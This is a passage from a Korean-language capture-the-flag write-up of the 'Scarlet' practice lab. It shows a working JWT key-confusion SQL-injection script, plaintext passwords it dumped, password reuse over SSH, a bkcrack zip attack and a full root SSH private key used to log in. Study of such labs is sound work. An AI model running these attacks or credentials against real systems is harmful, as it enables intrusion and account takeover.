ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"
JT="/home/kali/git/jwt_tool/jwt_tool.py"
PK="/tmp/nfs/essentials/public.key"
URL="http://scarlet.local/portal"

# username 자리에 payload 주입 → 1번 컬럼 반사값만 추출
inject() {
  local token
  token=$(python "$JT" "$ORIG" -X k -pk "$PK" -I -pc username -pv "$1" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
  curl -s "$URL" -H "Cookie: session=$token" | grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'
}

echo "=== [1] 전체 스키마 (모든 테이블 CREATE 문) ==="
inject "zzz' UNION SELECT group_concat(sql,' ||| '),2,3 FROM sqlite_master WHERE type='table'-- -"

echo -e "\n=== [2] 테이블 이름 목록 ==="
TABLES=$(inject "zzz' UNION SELECT group_concat(name,' '),2,3 FROM sqlite_master WHERE type='table'-- -")
echo "$TABLES"

echo -e "\n=== [3] users로 추정되는 테이블 전체 덤프 시도 ==="
# 흔한 사용자 테이블/컬럼 조합 자동 순회
for tbl in users user accounts members authors admin; do
  for pair in "username||':'||password" "user||':'||pass" "name||':'||password" "email||':'||password" "username||':'||pass"; do
    res=$(inject "zzz' UNION SELECT group_concat($pair,'  '),2,3 FROM $tbl-- -")
    if [ -n "$res" ] && ! echo "$res" | grep -qi "error\|no such"; then
      echo "[+] $tbl ($pair):"
      echo "    $res"
    fi
  done
done

echo -e "\n=== [4] 위에서 안 나오면 [1]의 스키마를 보고 수동으로 컬럼명 맞춰야 함 ==="
```

**스크립트 구조 해설 — 이 형태를 시험에 그대로 가져가라:**

| 구성 | 역할 |
|---|---|
| `inject()` 함수 | **"페이로드 → 서명 → 전송 → 반사값 추출"을 한 줄로 압축.** 인젝션 지점이 토큰 안에 있을 때의 핵심 추상화 |
| `grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+'` | jwt_tool 출력에서 토큰만 뽑는다. `(?<=...)`는 **너비 0 후방탐색** — 매치 결과에 포함되지 않는다 |
| `grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'` | 포털 HTML에서 **반사 지점만** 뽑는다. `.*?`는 최소 매치(greedy 방지) |
| `sqlite_master` | **SQLite의 스키마 카탈로그.** MySQL의 `information_schema.tables`, MSSQL의 `sys.tables`에 해당한다 |
| 테이블/컬럼 조합 순회 | 스키마 추출이 실패했을 때의 **폴백**. 흔한 이름을 브루트포스한다 |

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ./scarlet_all.sh
=== [1] 전체 스키마 (모든 테이블 CREATE 문) ===

=== [2] 테이블 이름 목록 ===
users sqlite_sequence

=== [3] users로 추정되는 테이블 전체 덤프 시도 ===
[+] users (username||':'||password):
    brian:Standingbytheseaside12  4leaf:password1

=== [4] 위에서 안 나오면 [1]의 스키마를 보고 수동으로 컬럼명 맞춰야 함 ===
```

**[1] 스키마 추출은 빈 결과로 실패했지만, [3]의 폴백이 답을 냈다.** 실패 원인은 6장에서 다룬다.

**획득: `brian` / `Standingbytheseaside12`** — 평문이다. 해시가 아니다.

> [!warning] 비밀번호가 **평문 저장**이면 재사용을 즉시 의심하라
> 해시였다면 크랙 단계가 하나 더 필요했다. 평문이 나왔다는 것은 **개발자가 보안을 신경 쓰지 않았다**는 신호이고, 그런 시스템은 **웹 비밀번호 = 시스템 비밀번호**일 확률이 높다.
> **덤프 직후 반사적으로 `ssh <user>@<target>` 을 쳐라.** 여기서는 그게 통했다.

### 3-8. SSH — 비밀번호 재사용

```bash
┌──(kali㉿kali)-[~]
└─$ ssh brian@192.168.248.222
The authenticity of host '192.168.248.222 (192.168.248.222)' can't be established.
ED25519 key fingerprint is: SHA256:EcFUQ3abooLm3ZmBChJ1yx8VqJ5nj/Htk22+PfBdxUo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.248.222' (ED25519) to the list of known hosts.
brian@192.168.248.222's password:
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
 ... (MOTD 중략) ...
  System information as of Wed Aug 19 07:15:36 AM UTC 2026

  System load:  0.0               Processes:               231
  Usage of /:   59.4% of 9.75GB   Users logged in:         0
  Memory usage: 35%               IPv4 address for ens160: 192.168.248.222
  Swap usage:   0%
 ... (중략) ...
*** System restart required ***
 ... (중략) ...
$ ls
local.txt  web
$ cat lo
cat: lo: No such file or directory
$ cat local.txt
95d749deeb0864d9ebd76f2e212788b7
```

프롬프트가 `$`뿐이다 — **`sh` 계열 셸**이라 탭 완성·히스토리가 없다. 바로 bash로 올린다.

```bash
/bin/bash -i
```

> [!tip] 셸 안정화 — SSH는 이미 TTY지만 셸이 빈약할 때
> SSH 로그인은 PTY를 이미 갖고 있으므로 `python3 -c 'import pty...'` 가 필요 없다. **로그인 셸이 `/bin/sh`인 것이 문제**다.
> ```bash
> /bin/bash -i                          # 이 박스에서 쓴 방법
> exec /bin/bash --login                # 프로필까지 읽고 싶으면
> ssh brian@TARGET -t "/bin/bash -i"    # 접속과 동시에
> ```
> 리버스셸에서 올라온 경우라면 순서가 다르다:
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> ^Z ; stty raw -echo ; fg ; export TERM=xterm ; stty rows 50 cols 200
> ```
> `python3`가 없으면 `script -qc /bin/bash /dev/null`.

---

## 4. 권한상승

### 4-1. 표준 열거 — 다섯 가지를 먼저 친다

셸을 잡자마자 치는 것들이다. **여기서는 전부 공회전했다** — 그 사실 자체가 정보다.

```bash
brian@scarlet:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/mnt/share *(rw,sync,no_subtree_check)
```

**`no_root_squash`가 없다.** 2-1절의 판정이 여기서 확정된다 — NFS 권한상승 경로는 닫혀 있다.

```bash
brian@scarlet:~$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/16010/usr/lib/snapd/snap-confine
/snap/snapd/16292/usr/lib/snapd/snap-confine
 ... (snap/core20 하위 22개 중략 — 전부 배포판 기본) ...
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/sudo
/usr/sbin/mount.nfs
```

**전부 Ubuntu 22.04 기본 SUID다. 커스텀 바이너리가 하나도 없다** → SUID 경로 없음.

> [!note] SUID 목록을 읽는 법 — 30초 안에 판정한다
> 1. **`/snap/` 아래는 무시한다.** 스냅 패키지의 사본이라 노이즈다. `find / -perm -4000 -type f 2>/dev/null | grep -v snap` 으로 시작하는 게 낫다
> 2. **배포판 기본 목록과 대조한다.** `su`·`sudo`·`mount`·`umount`·`passwd`·`chsh`·`chfn`·`gpasswd`·`newgrp`·`pkexec`·`fusermount3`·`ssh-keysign`·`dbus-daemon-launch-helper`·`polkit-agent-helper-1` — **이게 전부면 SUID 경로는 없다**
> 3. **낯선 이름 하나**가 목록에 끼어 있으면 그게 답이다. GTFOBins에 던진다
> 4. `pkexec`가 보이면 **PwnKit(CVE-2021-4034)** 을 떠올리되, Ubuntu 22.04는 출시 시점에 이미 패치돼 있다. 여기서는 통하지 않는다

```bash
brian@scarlet:~$ getcap -r / 2>/dev/null
/snap/core20/1611/usr/bin/ping cap_net_raw=ep
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

`cap_net_raw`뿐 — **권한상승용 capability가 아니다.** 위험한 것은 `cap_setuid`(→ 즉시 root), `cap_dac_read_search`(→ 임의 파일 읽기), `cap_sys_admin`, `cap_sys_ptrace`다. 하나도 없다.

```bash
brian@scarlet:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
brian@scarlet:~$ ls -la /etc/cron.d/ 2>/dev/null
total 16
drwxr-xr-x   2 root root 4096 Jun 16  2022 .
drwxr-xr-x 104 root root 4096 Feb 20  2025 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
```

**전부 기본값.** 커스텀 크론잡 없음 → 크론 경로도 닫혀 있다.

> [!tip] 셸을 잡자마자 칠 명령 — 이 박스 버전
> ```bash
> id ; sudo -l                                   # ← 원문에 sudo -l 기록이 없다. 반드시 쳐라
> find / -perm -4000 -type f 2>/dev/null | grep -v snap
> getcap -r / 2>/dev/null
> cat /etc/crontab ; ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
> ps aux --forest | grep -v '\[' ; ss -lntup
> ls -la /opt /srv /var/backups /var/www /home/*        # ← 이 박스의 정답은 여기 있었다
> ```
> **`/opt`·`/srv`·`/var/backups`를 보는 습관이 이 박스를 푼다.** SUID·크론·capability를 다 훑고 나서야 보는 게 아니라 **같은 라운드에서 한 번에** 본다.

### 4-2. 실제 정답 — `/opt/backup.zip`

프로세스와 파일시스템을 훑자 답이 나온다.

```bash
brian@scarlet:~$ ps aux | grep -i node | grep -v grep
find / -name "app.js" -o -name "server.js" 2>/dev/null | grep -vE "node_modules|snap"
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null | grep -v snap
ls -la /var/www /opt /srv 2>/dev/null
brian       1199  2.0  3.3 915192 68716 ?        Ssl  02:16   6:19 node /home/brian/web/index.js
 ... (/var/cache/man/*/index.db 25개 중략 — man 페이지 캐시 노이즈) ...
/var/lib/command-not-found/commands.db
/var/lib/PackageKit/transactions.db
/usr/share/mime/application/vnd.sqlite3.xml
/usr/lib/firmware/regulatory.db
/home/brian/web/database.db
/opt:
total 3484
drwxr-xr-x  2 root  root     4096 Jul 18  2022 .
drwxr-xr-x 19 root  root     4096 Jun 15  2022 ..
-rw-r--r--  1 brian brian 3557636 Jul 17  2022 backup.zip

/srv:
total 8
drwxr-xr-x  2 root root 4096 Apr 21  2022 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..

/var/www:
total 12
drwxr-xr-x  3 root root 4096 Jul 18  2022 .
drwxr-xr-x 14 root root 4096 Jul 18  2022 ..
drwxr-xr-x  2 root root 4096 Jul 18  2022 html
```

세 가지가 동시에 확정된다:

| 발견 | 의미 |
|---|---|
| `node /home/brian/web/index.js` — **brian 권한으로 구동** | 웹앱이 root가 아니다. **웹 RCE를 얻어도 brian일 뿐** — 우리가 이미 가진 권한이다 |
| `/home/brian/web/database.db` | 아까 SQLi로 덤프한 그 SQLite 파일. 이제 직접 읽을 수 있다 |
| **`/opt/backup.zip` 3.5MB, `brian brian` 소유** | 시스템 기본 파일이 아니다. **의도적으로 배치된 것** |

내용을 본다. **zip은 암호가 걸려 있어도 파일 목록은 읽힌다** — 중앙 디렉터리가 암호화되지 않기 때문이다.

```bash
brian@scarlet:/tmp/bk$ python3 -c "import zipfile; z=zipfile.ZipFile('backup.zip'); print('\n'.join(z.namelist()))" | head -60
ssh-keys/
ssh-keys/id_rsa
web/
web/middleware/
web/middleware/AuthMiddleware.js
web/css/
web/css/style.css
web/scarlet.local
web/public.key
web/index.js
web/default
web/private.key
web/package.json
web/views/
web/views/index.html
web/views/login.html
web/views/portal.html
web/assets/
web/assets/smoothscroll/
 ... (assets 하위 정적 파일 40여 개 중략) ...
web/assets/socicon/
web/assets/socicon/css/
```

**첫 두 줄이 답이다.** `ssh-keys/id_rsa`.

그리고 **`web/public.key`** — 우리가 NFS에서 이미 확보한 바로 그 파일이다. **이 순간 known-plaintext 공격의 재료가 갖춰진다.**

> [!danger] **이 연결을 놓치면 여기서 막힌다**
> zip에 암호가 걸려 있으므로 보통은 `zip2john backup.zip > h && john h`로 간다. 3.5MB 아카이브의 암호를 사전공격으로 못 맞히면 그대로 막다른 길이다.
> **탈출구는 "목록에 내가 이미 가진 파일이 있는가"를 보는 것**이다. `web/public.key`가 NFS의 `essentials/public.key`와 같다는 판단 하나가 사전공격 전체를 건너뛴다.
> **일반화: 암호 걸린 아카이브를 만나면 `unzip -l` 또는 `zipfile.namelist()`로 목록부터 본다. 목록은 암호 없이 읽힌다.**

`web/private.key`도 들어 있다 — JWT 서명용 RSA 개인키다. 복호화하면 **키 혼동 없이도 정상 RS256 토큰을 발행**할 수 있게 된다. 이 시점에는 이미 필요 없지만, **순서가 달랐다면 이쪽이 정공법**이었다.

### 4-3. bkcrack — 알려진 평문으로 키 복구

파일을 칼리로 내린다.

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ scp brian@192.168.248.222:/opt/backup.zip .
brian@192.168.248.222's password:
backup.zip                                                          100% 3474KB   1.4MB/s   00:02
```

known-plaintext를 **deflate 스트림으로 변환**한다(2-5절 참조). 이 한 단계를 빼먹으면 공격이 실패한다.

```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ cd ~/git/bkcrack/build/src/cli

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ls ~/git/bkcrack/tools/
deflate.py  inflate.py

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ python3 ~/git/bkcrack/tools/deflate.py < /tmp/nfs/essentials/public.key > pub.deflate

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ./bkcrack -C ~/PG/Scarlet/backup.zip -c web/public.key -p pub.deflate
bkcrack 1.8.1 - 2025-10-25
[16:32:24] Z reduction using 623 bytes of known plaintext
100.0 % (623 / 623)
[16:32:24] Attack on 14181 Z values at index 10
Keys: c45cce0e 772c014e 98bbd8be
32.3 % (4575 / 14181)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 4575
[16:32:29] Keys
c45cce0e 772c014e 98bbd8be
```

**5초.** 3.5MB 아카이브의 암호를 몰라도 내부 키가 나왔다.

**플래그 해설:**

| 플래그 | 의미 | 주의점 |
|---|---|---|
| `-C <파일>` | 대상 **암호화된 zip** (Ciphertext archive) | — |
| `-c <엔트리>` | 아카이브 **안의 어느 엔트리**를 아는가. 경로를 정확히 써야 한다 | `web/public.key` — `unzip -l`의 이름과 **완전 일치**해야 한다 |
| `-p <파일>` | **알려진 평문 파일.** 엔트리가 deflate면 deflate된 것을 준다 | 여기가 최대 함정. 원본을 그냥 주면 실패한다 |
| `-o <오프셋>` | 평문이 엔트리의 몇 바이트째부터 일치하는지 | 부분 평문(파일 헤더만 아는 경우)에 쓴다 |
| `-k k0 k1 k2` | 복구된 내부 키로 **복호화 수행** | 아래 단계 |
| `-D <출력>` | 암호를 제거한 새 zip을 쓴다 | `-U <출력> <새암호>`는 새 암호로 재암호화 |

> [!note] 출력 읽는 법
> - `Z reduction using 623 bytes` — **623은 파일 크기가 아니다.** 넘긴 평문 `pub.deflate`는 **630바이트**이고, 623은 **Z reduction에 실제로 쓴 값의 개수**다(= 630 − contiguousSize(8) + 1). (독립 재현: NFS `public.key` PEM 800바이트를 raw deflate하면 레벨 1~9 전부 630바이트가 나온다.) **bkcrack 기준 최소 요구는 12바이트**이고, 많을수록 빠르다 — 요구 길이의 이론 수치는 2-5절 참조
> - `Attack on 14181 Z values` — 후보 공간. 32.3%(4575번째)에서 해를 찾았다
> - `--continue-attack 4575` — **해가 여럿일 수 있으므로** 이어서 탐색할 수 있다는 안내. 첫 해로 복호화가 실패하면 이걸 쓴다

복구한 키로 아카이브 전체를 푼다. **암호 입력은 없다.**

```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ./bkcrack -C ~/PG/Scarlet/backup.zip \
  -k c45cce0e 772c014e 98bbd8be \
  -D decrypted.zip
bkcrack 1.8.1 - 2025-10-25
[16:33:10] Writing decrypted archive decrypted.zip
100.0 % (53 / 53)

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ls
bkcrack  CMakeFiles  cmake_install.cmake  decrypted.zip  libbkcrack-cli.a  Makefile  pub.deflate

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ unzip decrypted.zip -d out
Archive:  decrypted.zip
   creating: out/ssh-keys/
  inflating: out/ssh-keys/id_rsa
   creating: out/web/
   creating: out/web/middleware/
  inflating: out/web/middleware/AuthMiddleware.js
   creating: out/web/css/
  inflating: out/web/css/style.css
  inflating: out/web/scarlet.local
  inflating: out/web/public.key
  inflating: out/web/index.js
  inflating: out/web/default
  inflating: out/web/private.key
  inflating: out/web/package.json
   creating: out/web/views/
  inflating: out/web/views/index.html
  inflating: out/web/views/login.html
  inflating: out/web/views/portal.html
 ... (정적 자산 40여 개 중략) ...
   creating: out/web/routes/
  inflating: out/web/routes/index.js
   creating: out/web/helpers/
  inflating: out/web/helpers/JWTHelper.js
  inflating: out/web/helpers/DBHelper.js
  inflating: out/web/database.db
```

**`53/53` — 전 엔트리 복호화 성공.** 그리고 딸려 나온 것들이 값지다:

- `out/web/helpers/JWTHelper.js` — **키 혼동 취약점의 원인 코드**가 여기 있다
- `out/web/routes/index.js` — **SQL 문자열 연결**이 여기 있다
- `out/web/private.key` — JWT 서명 개인키
- `out/web/database.db` — 사용자 테이블 원본

`[가정]` 원문에 이 파일들의 내용은 기록되지 않았다. **시험 상황이라면 반드시 열어봐야 한다** — 보고서의 근본 원인 서술이 여기서 나온다.

### 4-4. 개인키 — 소유자를 먼저 확인한다

```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ cat out/ssh-keys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsrYySwRSGPONIHCBe/9gR2zdxTDQDZziJAeuWB954pJ6VMU5drqB
UnDfN0dCOg4esxuG6CMPMaTtGnERD01UWGJMK+7N7oy9EqjxxyR4UoG9wsFGBCNY1JWVaB
HnoBTXOwRc17lh8s+bSAVEdRdp9895DCo45Dt3+FNgtWk2Zb/5ayUTIaLUaWVfMu4wYJb8
yWLqE4F0XsTk6xV0nYpJXTE87TZ/oj69ZU23UzLppA5gH8k4KjITRlxUU0xUaeeYM7CPEd
3Ax/C7+1qGtAHQaDpY4YymQZQOssYslKt7EFme9zbz2V4xAjBGRcip0gCZCYCGWftGt73n
7RY9sl9A6tO6zuBsT/GA1wzoSK8Xa3SrsCQ5WKz5U512u5xFpjYJhAJPkglpy6C51/j7e+
d0X9w98LNqZysH+4x6o77qj0q69KvmlanMpIhGvho5GUD81/bv/xOwuMYA0v2mjitx7g0h
6SivppoB/9F/6MyTET7gQ291S226t6dNmqOJq/19AAAFiNyNXgPcjV4DAAAAB3NzaC1yc2
EAAAGBALK2MksEUhjzjSBwgXv/YEds3cUw0A2c4iQHrlgfeeKSelTFOXa6gVJw3zdHQjoO
HrMbhugjDzGk7RpxEQ9NVFhiTCvuze6MvRKo8cckeFKBvcLBRgQjWNSVlWgR56AU1zsEXN
e5YfLPm0gFRHUXaffPeQwqOOQ7d/hTYLVpNmW/+WslEyGi1GllXzLuMGCW/Mli6hOBdF7E
5OsVdJ2KSV0xPO02f6I+vWVNt1My6aQOYB/JOCoyE0ZcVFNMVGnnmDOwjxHdwMfwu/tahr
QB0Gg6WOGMpkGUDrLGLJSrexBZnvc289leMQIwRkXIqdIAmQmAhln7Rre95+0WPbJfQOrT
us7gbE/xgNcM6EivF2t0q7AkOVis+VOddrucRaY2CYQCT5IJacugudf4+3vndF/cPfCzam
crB/uMeqO+6o9KuvSr5pWpzKSIRr4aORlA/Nf27/8TsLjGANL9po4rce4NIekor6aaAf/R
f+jMkxE+4ENvdUtturenTZqjiav9fQAAAAMBAAEAAAGALLL1kV3bSvJf8iUxvdn6MuM/9P
poj38V8P0a1l/JFKqefmV2IgQ0JHKm4iSoo+y0MQhJjfZ27mvaAisVoUYuOo0bkEGCsI/z
Gp+3GaA9mCVrWTMOWCqfJUzkucsArEGKM/C7aBmuLhVPOYxXuxHIJ3t1Q12sLSnSsAHqxn
UybfC+adY0Gs2nY1U/onWBFCevwo9DDO3sNWf5+fK74EueXfjazFo9Qk9+/7+Ygu7REX+m
+0xRB/zOZWLilJMa6gJK2yjOMZjzLRvtpBufizKa+/HF1QWMq0IcBwhCnolDZIKl5SNQh3
ao1ZKLGCra2RJAnUTMR2G8MNXG7cH0Uq8287GiJ+EUHJT3VTbKT/a50X9k5SMjgVNO2CBR
cQu+NwdPsrmTOy1uu/ENzl8IWB9x1x1t4/UzlUumoHz7Hjvzgnk+Bz5RIyhejoMb2UoauT
1UsgdZt2dEZeT5Q3JzFkjuFbJepj5c1luqSfO7FWNaVP2kBIj++M9G01kfBWL29aLhAAAA
wGCo+hab0q21JopNgO5BAWyP1/7jrQh1FVQRM2s6hBqKxB0wwOhizu67BsNZt3FhnX1Aw+
3Vw816F+AEZw2LXfemZbsKZri80vHEU6hXAOWw5g4SiYsA/q7nIxD2S9WtSuGlpGltV114
saChWghKOg2oxelk4vv4l/zCF19QueLVfIjnHC7DSD/+idY6zXYH09IJYge8BI8OKEXLXd
37vAK6nptlkki/x+ZzaGeSI5/+LL5JSgiP33oXtXExp1MKewAAAMEA+NmN7lb5viHPi6ay
h5piwjqhOZ7AygL26B3Ba7073UHEUI4Q8VE+85n2xnUKt1QLInzv4kalcUpVuQN7XLOLLe
DtR7qlmGPDl84+8oNWrKkUzZ0G5P9ayze0dmvW9MNUpHGU25+e46f443H1R3nBv7ki5dYM
/3XJl8blhMCp3v5Xp/pMfQuoo3O9rHA+66ewS91UcE9FuN0MEGZFdSnpBzJq1IT9CrUv7/
6ztlTuDYZXnuOmH1Rh8BzEaYFWRaUrAAAAwQC32LuCnlEAU7DXAdvQKlyN77KNY6/7BYwX
jafmJxBh2djHv+lcIa5GIdti/12TKReXt9m+k7cZcVNtyANa/OULZqel1QDZpSqo2PfxVD
SPbKkuHZ0UfkPGAWiK8vlVCCdJHnEsmF1wKJP8cq3i2L1kjXm5eyuD9MbCK1n5hqipmjeQ
N8fNAZC39wNQykYWu/B6K6pR6BdVuL4nu+Jl59qiIXzZdwvd2pDBhIHXSUvte2w/ZGYSA5
z0hSBkM9/OY/cAAAAMcm9vdEBzY2FybGV0AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

> [!tip] **키를 쓰기 전에 "누구 키인가"부터 확인하라**
> 마지막 줄 근처의 `AAAAMcm9vdEBzY2FybGV0` — base64로 `root@scarlet`이다. OpenSSH 개인키 형식은 **끝부분에 코멘트를 평문 base64로 담는다.**
> ```bash
> ssh-keygen -l -f id_rsa        # 지문 + 코멘트를 바로 보여준다
> ssh-keygen -y -f id_rsa        # 대응 공개키 산출 → authorized_keys와 대조 가능
> grep -o 'cm9vdEB[A-Za-z0-9+/=]*' id_rsa | base64 -d   # 코멘트만 뽑기
> ```
> **`root@scarlet`이라는 코멘트 하나로 "이 키는 root 로그인용"이라는 판단이 선다.** 사용자 이름을 몰라 헤매는 시간이 통째로 사라진다.
> 단 코멘트는 **관례일 뿐 보증이 아니다** — 안 맞으면 `/etc/passwd`의 사용자를 순회한다.

### 4-5. root 로그인

```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ vi keykey

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ chmod 600 keykey

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ssh -i keykey root@192.168.248.222
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
 ... (MOTD 중략) ...
  System information as of Wed Aug 19 07:34:18 AM UTC 2026

  System load:  0.0               Processes:               237
  Usage of /:   59.4% of 9.75GB   Users logged in:         1
  Memory usage: 38%               IPv4 address for ens160: 192.168.248.222
  Swap usage:   0%
 ... (중략) ...
*** System restart required ***
Last login: Fri Aug 26 02:36:00 2022
root@scarlet:~# ls
proof.txt  snap
root@scarlet:~# cat proof.txt
07e450d973658eaa9fe028265ba6b784
```

> [!danger] **`chmod 600`을 빼먹으면 여기서 막힌다** — 단, 이 박스에서는 겪지 않았다
> **위 원문 순서가 `vi keykey` → `chmod 600 keykey` → `ssh -i keykey`이므로 경고가 발생할 여지가 없었다.** 아래는 순서를 어겼을 때 벌어지는 일에 대한 **설명이지 관측된 출력이 아니다.**
> 권한이 `0644`인 키로 `ssh -i`를 치면 OpenSSH는 `WARNING: UNPROTECTED PRIVATE KEY FILE!` 배너와 함께 `Permissions 0644 for 'keykey' are too open.`, `It is required that your private key files are NOT accessible by others.`, 그리고 **`This private key will be ignored.`** 를 찍고 그 키를 **쓰지 않는다.**
> **왜 이 검사가 있는가:** SSH 클라이언트는 개인키를 **비밀번호와 동급**으로 취급한다. 다중 사용자 시스템에서 `0644`(그룹·기타 사용자 읽기 가능)면 같은 호스트의 다른 사용자가 키를 훔칠 수 있다. 그래서 openssh는 **군말 없이 키를 무시**한다 — "권한 문제"라고 명시해 주지만, 급하면 "키가 틀렸나" 하고 엉뚱한 데를 판다.
> **`0600` = 소유자만 읽기·쓰기.** `0400`(읽기 전용)도 된다.
> **반사 규칙: 개인키 파일을 만든 직후 `chmod 600`을 친다. 예외 없이.**
> 부수 함정 둘:
> - **파일이 `root` 소유인데 일반 사용자로 `ssh`를 쓰면** 권한이 맞아도 못 읽는다. `chown $USER:$USER keykey`
> - **에디터가 붙인 CRLF·트레일링 공백**은 키를 깨뜨린다. `vi`로 붙여넣었다면 `file keykey`로 확인하고 `dos2unix`를 돌린다

---

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/brian/local.txt` | `95d749deeb0864d9ebd76f2e212788b7` |
| `proof.txt` | `/root/proof.txt` | `07e450d973658eaa9fe028265ba6b784` |

둘 다 **표준 위치**다. PG의 관례대로 사용자 홈과 `/root`에 각각 하나씩.

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그 값만으로는 **점수가 인정되지 않는다.** 다음을 **한 화면에** 담아야 한다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스에서 찍는다면:
> ```bash
> root@scarlet:~# whoami; hostname; ip a | grep 'inet '; cat /root/proof.txt
> ```
> **이 노트에는 스크린샷이 없다.** 원문 작업 시 캡처를 남기지 않았기 때문이다. 시험 대비 관점에서는 이것이 결함이다 — **플래그를 얻는 순간이 곧 캡처 시점**이라는 반사를 몸에 붙여야 한다. 랩에서도 습관을 들여라.

---

## 6. 막혔던 지점 / 시행착오

이 박스의 실제 기록에서 건져낸 것들이다. **성공 경로보다 이쪽이 다음 박스를 구한다.**

### ① IP로 디렉터리 버스팅 3분 — 그리고 결과는 2건

가장 큰 시간 손실이다. `http://192.168.248.222/`에 raft-medium + 확장자 5종 + 재귀 4단계를 걸어 **3분에 18만 요청**을 쐈고, 나온 것은 **66바이트 index.html 하나**였다.

